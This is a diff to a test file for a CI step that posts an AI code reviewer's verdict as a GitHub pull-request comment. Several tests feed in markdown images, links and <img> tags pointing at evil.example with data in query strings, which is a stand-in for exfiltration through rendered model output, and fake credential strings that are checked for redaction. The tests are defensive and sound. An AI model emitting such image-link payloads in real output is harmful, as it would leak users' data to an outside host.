@@ -379,16 +379,43 @@ test('a failed search-tool setup is named as the reason', async () => {
   assert.match(r.reason, /search tools could not be set up/);
 });
 
-test('images, links and HTML cannot carry data off the platform', async () => {
-  const r = await verdict([gateInit(), answer(), done('VERDICT: FINDINGS\n1. [P1] a.js:1 — see ![x](https://evil.example/?d=secret) and [y](https://evil.example/?d=2) and <img src="https://evil.example/?d=3">')]);
-  assert.equal(r.verdict, 'findings');
-  assert.ok(!/!\[|\]\(|<img/.test(r.text), r.text);
-  assert.ok(r.text.includes('&lt;img'));
+test('a FINDINGS answer with any other line gives no verdict', async () => {
+  for (const bad of ['VERDICT: FINDINGS\n1. [P1] a.js:1 — x\nAlso, note that…', 'VERDICT: FINDINGS\n1. [P1] a.js:1 — x\n  continued here']) {
+    const r = await verdict([gateInit(), answer(), done(bad)]);
+    assert.equal(r.verdict, 'unavailable');
+    assert.match(r.reason, /verdict format/);
+  }
+});
+
+// The post step: the text goes into a fence that outruns any backtick run in it, so nothing it holds renders.
+const postComment = stepScript('post', 'github', 'context');
+async function posted(text, verdict = 'findings', reason = '') {
+  const bodies = [];
+  Object.assign(process.env, { HEAD_SHA: HEAD, VERDICT: verdict, TEXT: text, REASON: reason });
+  const github = { paginate: async () => [], rest: { issues: { listComments: () => {}, createComment: async ({ body }) => bodies.push(body), updateComment: async ({ body }) => bodies.push(body) } } };
+  await postComment(github, { repo: { owner: 'o', repo: 'r' }, payload: { pull_request: { number: 7 } } });
+  return bodies[0];
+}
+
+test('the posted text is fenced, and the fence outruns the text', async () => {
+  const text = 'VERDICT: FINDINGS\n1. [P1] a.js:1 — ![x](https://evil.example/?d=1) <img src="https://evil.example/?d=2"> ``` and ````';
+  const body = await posted(text);
+  const lines = body.split('\n');
+  assert.equal(lines[0], `<!-- ai-review:claude sha=${HEAD} verdict=findings -->`);
+  assert.equal(lines[4], '`````text');
+  assert.equal(lines.at(-1), '`````');
+  assert.equal(lines.slice(5, -1).join('\n'), text);
+});
+
+test('no verdict posts the reason, unfenced', async () => {
+  const body = await posted('', 'unavailable', 'why');
+  assert.match(body, /_Claude gave no verdict for this commit \(why\)/);
+  assert.ok(!body.includes('```'));
 });
 
 test('private keys and other credential shapes are scrubbed', async () => {
   const r = await verdict([gateInit(), answer(),
-    done('VERDICT: FINDINGS\n1. [P0] k.pem:1 — -----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY----- AKIAABCDEFGHIJKLMNOP github_pat_abcdefghijklmnopqrstuvwxyz xoxb-1234567890-abc')]);
+    done('VERDICT: FINDINGS\n1. [P0] k.pem:1 — -----BEGIN RSA PRIVATE KEY----- MIIE... -----END RSA PRIVATE KEY----- AKIAABCDEFGHIJKLMNOP github_pat_abcdefghijklmnopqrstuvwxyz xoxb-1234567890-abc')]);
   assert.equal(r.text.match(/\[redacted\]/g).length, 4, r.text);
   assert.ok(!/BEGIN|AKIA|github_pat|xoxb/.test(r.text));
 });
